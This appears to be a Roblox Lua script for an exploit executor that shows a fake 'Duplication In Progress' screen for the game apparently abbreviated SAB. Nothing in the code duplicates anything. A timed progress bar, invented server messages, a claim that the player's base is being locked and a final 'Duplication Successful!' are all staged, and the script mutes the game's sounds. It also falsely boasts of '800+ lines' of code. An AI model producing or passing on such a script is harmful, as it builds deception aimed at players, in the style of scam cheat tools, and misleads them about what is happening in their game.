-- Custom Loading Screen (Steel Gray, Polished with Particles and Left-side Spinner)
--!strict
local Players = game:GetService("Players")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")

ReplicatedFirst:RemoveDefaultLoadingScreen()
local player = Players.LocalPlayer or Players.PlayerAdded:Wait()

-- Mute all workspace sounds
local mutedSounds = {}
local function muteSound(sound: Sound)
	if not mutedSounds[sound] then
		mutedSounds[sound] = sound.Volume
		sound.Volume = 0
	end
end

for _, s in pairs(Workspace:GetDescendants()) do
	if s:IsA("Sound") then muteSound(s) end
end

Workspace.DescendantAdded:Connect(function(d)
	if d:IsA("Sound") then muteSound(d) end
end)

-- Screen GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CustomLoadingScreen"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = CoreGui

-- Main Frame with steel gray gradient
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(1,0,1,0)
MainFrame.BorderSizePixel = 0
MainFrame.ZIndex = 1
MainFrame.Parent = ScreenGui

local Gradient = Instance.new("UIGradient")
Gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(105,105,105)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(50,50,50))
}
Gradient.Rotation = 90
Gradient.Parent = MainFrame

-- Particle Frame
local ParticleFrame = Instance.new("Frame")
ParticleFrame.Size = UDim2.new(1,0,1,0)
ParticleFrame.BackgroundTransparency = 1
ParticleFrame.ZIndex = 0
ParticleFrame.Parent = MainFrame

-- Create particles
for i = 1,100 do
	local particle = Instance.new("Frame")
	local sizeVal = math.random(6,12)
	particle.Size = UDim2.new(0,sizeVal,0,sizeVal)
	particle.Position = UDim2.new(math.random(),0,math.random(),0)
	particle.BackgroundColor3 = Color3.fromRGB(255,255,255):Lerp(Color3.fromRGB(150,200,255), math.random())
	particle.BorderSizePixel = 0
	particle.BackgroundTransparency = 0.1 + math.random()*0.2
	particle.ZIndex = 0

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0.5,0)
	corner.Parent = particle

	local stroke = Instance.new("UIStroke")
	stroke.Color = Color3.fromRGB(180,220,255)
	stroke.Transparency = 0.4
	stroke.Parent = particle

	particle.Parent = ParticleFrame

	-- Animate upward with horizontal sway
	local startPos = particle.Position
	local endPos = UDim2.new(startPos.X.Scale + (math.random()-0.5)/4, startPos.X.Offset, startPos.Y.Scale - 0.25, startPos.Y.Offset)
	TweenService:Create(particle, TweenInfo.new(math.random(20,40), Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {Position = endPos}):Play()

	-- Twinkle effect (size pulsate)
	task.spawn(function()
		while particle.Parent do
			local newSize = UDim2.new(0, sizeVal + math.random(-3,3), 0, sizeVal + math.random(-3,3))
			TweenService:Create(particle, TweenInfo.new(2 + math.random(), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Size = newSize}):Play()
			task.wait(2 + math.random())
		end
	end)
end

-- Spinner container
local SpinnerContainer = Instance.new("Frame")
SpinnerContainer.Size = UDim2.new(0,50,0,50)
SpinnerContainer.Position = UDim2.new(0.2,0,0.35,0)
SpinnerContainer.BackgroundTransparency = 1
SpinnerContainer.BorderSizePixel = 0
SpinnerContainer.ZIndex = 2
SpinnerContainer.Parent = MainFrame

-- Create spinner dots
local numDots = 12
local dots = {}
local dotRadius = 4
local spinnerRadius = 20

for i=1,numDots do
	local dot = Instance.new("Frame")
	dot.Size = UDim2.new(0,dotRadius*2,0,dotRadius*2)
	dot.BackgroundColor3 = Color3.fromRGB(255,255,255)
	dot.BorderSizePixel = 0
	dot.ZIndex = 3
	dot.Parent = SpinnerContainer
	local dotCorner = Instance.new("UICorner")
	dotCorner.CornerRadius = UDim.new(0.5,0)
	dotCorner.Parent = dot
	local angle = (i-1)*(360/numDots)
	local x = math.cos(math.rad(angle))*spinnerRadius
	local y = math.sin(math.rad(angle))*spinnerRadius
	dot.Position = UDim2.new(0.5,x-dotRadius,0.5,y-dotRadius)
	table.insert(dots,dot)
end

-- Spinner animation
task.spawn(function()
	local dotTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
	local function fadeDot(dotFrame, startTransparency, endTransparency)
		local tween = TweenService:Create(dotFrame,dotTweenInfo,{BackgroundTransparency = endTransparency})
		tween:Play()
		return tween
	end
	local currentIndex = 1
	while SpinnerContainer.Parent ~= nil do
		local currentDot = dots[currentIndex]
		local nextIndex = (currentIndex % numDots) + 1
		local nextDot = dots[nextIndex]
		fadeDot(currentDot,0,1)
		fadeDot(nextDot,1,0)
		currentIndex = nextIndex
		task.wait(0.08)
	end
end)

-- Duplication text
local DuplicationText = Instance.new("TextLabel")
DuplicationText.Size = UDim2.new(0.5,0,0.1,0)
DuplicationText.Position = UDim2.new(0.32,0,0.38,0)
DuplicationText.Text = "Duplication In Progress"
DuplicationText.TextColor3 = Color3.fromRGB(255,255,255)
DuplicationText.BackgroundTransparency = 1
DuplicationText.Font = Enum.Font.FredokaOne
DuplicationText.TextScaled = true
DuplicationText.TextXAlignment = Enum.TextXAlignment.Left
DuplicationText.ZIndex = 4
DuplicationText.Parent = MainFrame

-- System Messages
local SystemText = Instance.new("TextLabel")
SystemText.Size = UDim2.new(0.6,0,0.05,0)
SystemText.Position = UDim2.new(0.2, 0, 0.465, 0)
SystemText.TextColor3 = Color3.fromRGB(255,255,255)
SystemText.BackgroundTransparency = 1
SystemText.Font = Enum.Font.FredokaOne
SystemText.TextScaled = true
SystemText.TextWrapped = true
SystemText.ZIndex = 4
SystemText.Parent = MainFrame

local systemMessages = {
	"âš™ï¸ Digging up Server Workspace...",
	"ðŸ§  Found Brainrot in ReplicatedStorage...",
	"ðŸŒŒ Manipulating server...",
	"ðŸ”’ Syncing Files...",
	"ðŸ“¡ Cloning Brainrot.Data..."
}

task.spawn(function()
	local fadeTime = 0.5
	local totalDuration = 30
	for i, msg in ipairs(systemMessages) do
		SystemText.Text = msg
		SystemText.TextTransparency = 1
		TweenService:Create(SystemText, TweenInfo.new(fadeTime), {TextTransparency = 0}):Play()
		task.wait(totalDuration / #systemMessages)
	end
end)

-- Progress Bar
local ProgressBarFrame = Instance.new("Frame")
ProgressBarFrame.Size = UDim2.new(0.6,0,0.05,0)
ProgressBarFrame.Position = UDim2.new(0.2,0,0.55,0)
ProgressBarFrame.BackgroundColor3 = Color3.fromRGB(70,70,70)
ProgressBarFrame.BorderSizePixel = 0
ProgressBarFrame.ZIndex = 4
ProgressBarFrame.ClipsDescendants = true
ProgressBarFrame.Parent = MainFrame

local ProgressBarFill = Instance.new("Frame")
ProgressBarFill.Size = UDim2.new(0,0,1,0)
ProgressBarFill.BackgroundColor3 = Color3.fromRGB(0,255,0)
ProgressBarFill.BorderSizePixel = 0
ProgressBarFill.ZIndex = 5
ProgressBarFill.Parent = ProgressBarFrame

local ProgressText = Instance.new("TextLabel")
ProgressText.Size = UDim2.new(1,0,1,0)
ProgressText.Position = UDim2.new(0,0,0,0)
ProgressText.Text = "0.0%"
ProgressText.TextColor3 = Color3.fromRGB(255,255,255)
ProgressText.BackgroundTransparency = 1
ProgressText.Font = Enum.Font.FredokaOne
ProgressText.TextScaled = true
ProgressText.ZIndex = 6
ProgressText.Parent = ProgressBarFrame

-- Locking Text
	local LockingText = Instance.new("TextLabel")
	LockingText.Size = UDim2.new(0.6,0,0.05,0)
	LockingText.Position = UDim2.new(0.2,0,0.62,0)
	LockingText.Text = "Your base is being locked automatically, donâ€™t worry!"
	LockingText.TextColor3 = Color3.fromRGB(255,255,255)
	LockingText.BackgroundTransparency = 1
	LockingText.Font = Enum.Font.FredokaOne
	LockingText.TextScaled = true
	LockingText.ZIndex = 6
	LockingText.Parent = MainFrame
	
-- Entertainment Text
local EntertainmentText = Instance.new("TextLabel")
EntertainmentText.Size = UDim2.new(0.6,0,0.05,0)
EntertainmentText.Position = UDim2.new(0.2,0,0.70,0)
EntertainmentText.TextColor3 = Color3.fromRGB(255,255,255)
EntertainmentText.BackgroundTransparency = 1
EntertainmentText.Font = Enum.Font.FredokaOne
EntertainmentText.TextScaled = true
EntertainmentText.TextWrapped = true
EntertainmentText.ZIndex = 6
EntertainmentText.Parent = MainFrame

local entertainment = {
	"ðŸŽ¯ Fun Fact: 6 7",
	"ðŸš€ Did you know? In 1667...",
	"ðŸ¦‰ Meowls are real!!!",
	"ðŸŒŸ Zibzibzib",
	"ðŸ˜² A Famous SAB Youtuber Bought this script!",
	"ðŸŽ A former developer for Sammy helped Zuri make this!",
	"ðŸ™Œ Thank you for supporting!",
	"ðŸ¤·â€â™‚ï¸ Did somebody say 67?",
	"ðŸµ W speed!",
	"ðŸ§  ZuriScripts birthday is 6/7ðŸ¤£",
	"ðŸŽ² This script is supported by Delta",
	"ðŸŒ ZuriScripts is Filipino ðŸ˜²",
	"ðŸ’» This script contains over 800+ lines of optimized code",
}

task.spawn(function()
	local fadeTime = 0.8
	local index = 1
	while ScreenGui.Parent do
		TweenService:Create(EntertainmentText, TweenInfo.new(fadeTime), {TextTransparency = 1, Position = UDim2.new(0.2,0,0.72,0)}):Play()
		task.wait(fadeTime)
		EntertainmentText.Text = entertainment[index]
		index = (index % #entertainment) + 1
		TweenService:Create(EntertainmentText, TweenInfo.new(fadeTime), {TextTransparency = 0, Position = UDim2.new(0.2,0,0.70,0)}):Play()
		task.wait(8)
	end
end)

-- Progress fill with 30s total duration
local totalDuration = 30
local startTime = tick()
local reached100 = false

RunService.RenderStepped:Connect(function()
	local elapsed = tick() - startTime
	local t = math.clamp(elapsed / totalDuration, 0, 1)
	local eased = t^(1/3) -- fast start, slow finish
	local percent = eased * 100
	ProgressBarFill:TweenSize(UDim2.new(percent / 100, 0,1,0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 0.1, true)
	ProgressText.Text = string.format("%.1f%%", percent)

	if percent >= 100 and not reached100 then
		reached100 = true

		-- Update texts to success
		DuplicationText.Text = "âœ… Duplication Successful!"
		SystemText.Text = "All systems are operational."

		-- Add Rejoin Button
		local RejoinButton = Instance.new("TextButton")
		RejoinButton.Size = UDim2.new(0.2,0,0.05,0)
		RejoinButton.Position = UDim2.new(0.4,0,0.8,0)
		RejoinButton.Text = "Rejoin Server"
		RejoinButton.TextColor3 = Color3.fromRGB(255,255,255)
		RejoinButton.BackgroundColor3 = Color3.fromRGB(70,70,70)
		RejoinButton.Font = Enum.Font.FredokaOne
		RejoinButton.TextScaled = true
		RejoinButton.ZIndex = 7
		RejoinButton.Parent = MainFrame

		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(0.1,0)
		corner.Parent = RejoinButton

		RejoinButton.MouseButton1Click:Connect(function()
			Players:Chat("/rejoin") -- or teleport to same place
		end)
	end
end)
